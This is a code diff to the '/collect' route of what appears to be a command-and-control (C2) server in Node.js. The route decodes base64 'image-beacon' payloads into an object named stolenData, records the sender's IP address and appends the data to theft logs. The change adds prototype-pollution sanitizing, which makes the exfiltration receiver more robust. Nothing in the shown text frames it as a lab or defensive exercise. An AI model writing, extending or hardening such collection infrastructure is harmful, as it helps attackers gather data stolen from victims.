@@ -191,16 +191,27 @@ app.get('/collect', async (req, res) => {
     if (req.query.d) {
       // Decode base64 data
       const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
+      
+      // Security: Parse JSON and sanitize to prevent prototype pollution
       const stolenData = JSON.parse(decoded)
+      
+      // Remove dangerous prototype properties if present
+      if (stolenData && typeof stolenData === 'object') {
+        delete stolenData.__proto__
+        delete stolenData.constructor
+        // Create a clean object without prototype pollution
+        const cleanData = JSON.parse(JSON.stringify(stolenData))
+        Object.setPrototypeOf(cleanData, Object.prototype)
+        
+        cleanData.server = {
+          receivedAt: new Date().toISOString(),
+          clientIP: req.ip,
+          method: 'image-beacon'
+        }
 
-      stolenData.server = {
-        receivedAt: new Date().toISOString(),
-        clientIP: req.ip,
-        method: 'image-beacon'
+        await logStolenData(cleanData)
+        await appendToMasterLog(cleanData)
       }
-
-      await logStolenData(stolenData)
-      await appendToMasterLog(stolenData)
     }
   } catch (error) {
     console.error('[C2] Failed to process image beacon:', error)
